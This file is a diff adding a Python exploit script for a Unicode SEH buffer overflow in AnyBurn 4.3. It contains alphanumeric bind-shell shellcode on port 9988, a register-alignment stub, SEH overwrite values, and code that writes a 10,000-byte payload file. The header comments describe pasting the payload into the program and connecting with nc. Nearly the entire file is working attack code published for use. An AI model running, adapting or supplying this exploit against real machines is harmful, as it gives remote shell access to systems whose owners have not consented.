@@ -1,0 +1,69 @@
+#!/usr/bin/env python
+
+# Exploit Title: AnyBurn 4.3 - Local Buffer Overflow (SEH Unicode)
+# Date: 20-12-2018
+# Exploit Author: Matteo Malvica
+# Vendor Homepage: http://www.anyburn.com/
+# Software Link : http://www.anyburn.com/anyburn_setup.exe
+# Tested Version: 4.3 (32-bit) 
+# Tested on: Windows 7 x64 SP1
+# Credits: original vulnerability discovered by Achilles: https://www.exploit-db.com/exploits/46002
+
+# Steps to reproduce:
+# 1.- Run the python code
+# 2.- Open exploit.txt and copy its content to the clipboard
+# 3.- Open AnyBurn and choose 'Copy disk to Image'
+# 4.- Paste the content of exploit.txt into the field: 'Image file name'
+# 5.- Click 'Create Now' 
+# 6.- Check with command prompt 'netstat -ano' and you should see a port listening on 9988
+# 7.- With windows firewall disabled, from another host: 'nc [remote_IP] 9988'
+
+
+# alphanumeric bindshell - port 9988, courtesy of b33f
+shellcode = (
+"PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1"
+"AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABA"
+"BAB30APB944JBKLK8CYKPM0KPQP59ZEP18RQTTKQBNP4KQBLLTK0RLTDKC"
+"BMXLOWGOZO6NQKONQ7PVLOLC13LKRNLO0GQHOLMKQY7YRL022R74KPRLP4"
+"KPBOLKQJ0TKOPSHSU7PD4OZKQ8PPPTKQ8LX4KQHO0M1ICJCOLOYTK04TKM"
+"1YFP1KONQ7P6L7QXOLMKQ7W08K0RUZTM33ML8OKCMO4SEYRQHTKPXO4KQI"
+"CQV4KLLPK4KR8MLKQHSTKKT4KKQJ0SYOTO4NDQKQK1Q0Y1JPQKOIPB8QOQ"
+"JTKMBJKTFQM38NSOBKPKPQXBWBSNRQOB4QXPLBWNFLGKO8UWHDPM1KPKPN"
+"IWTPTPPBHO9SPRKKPKOJ50P20PP0P10PP10R0S89ZLOIOYPKO9EE9XGNQ9"
+"K1CRHM2KPNGKTTIK61ZLP0V0WBH7RYKOGS7KOXU0SPWQX7GIYOHKOKOZ50"
+"SB3R7C83DZLOKK1KO8UQGTIGWS8RURN0M1QKO8URHRC2MQTKPTIK31G0WP"
+"WNQL6QZMBR9R6JBKM1VY7OTMTOLM1KQTMOTO4N096KPQ4B4PPQF0VPVOV2"
+"6PNB6R6B3QF1X3IHLOO3VKOHUTIK00NR6PFKONP38LHU7MMQPKOXUGKJPG"
+"EVBPV38G6F5GM5MKOXUOLLF3LKZCPKKIPBUM57KOWMCSBRO2JM0PSKO9EA")
+
+
+# total payload length 10000
+
+align = (
+"\x55"                      #push EBP - closer register to our shellcode, from where we are pivoting
+"\x6e"                      #Venetian Padding
+"\x58"                      #pop EAX
+"\x6e"                      #Venetian Padding
+"\x05\x22\x11"              #add eax,0x11002200  \
+"\x6e"                      #Venetian Padding     |> +0xB00 
+"\x2d\x17\x11"              #sub eax,0x11001700  /
+"\x6e"                      #Venetian Padding
+"\x50"                      #push EAX
+"\x6e"                      #Venetian Padding
+"\xC3")                     #RETN
+
+nseh = "\x94\x94" 			# ANSI x94 translates to Unicode 201D
+seh =  "\xb5\x4d" 			# 0x004d00b5 POP POP RET in AnyBurn.exe module
+
+preamble = "\x58" * 47 + shellcode + "\x58" * (9197-47- len(shellcode)) + nseh + seh
+unicode_nops = "\x58" * 200
+exploit = preamble + align + unicode_nops + "\x58" * (10000 - len(preamble) - len(unicode_nops)-len(align))
+
+try:
+	f=open("exploit.txt","w")
+	print "[+] Creating %s bytes lasagna payload.." %len(exploit)
+	f.write(exploit)
+	f.close()
+	print "[+] File created!"
+except:
+	print "File cannot be created"
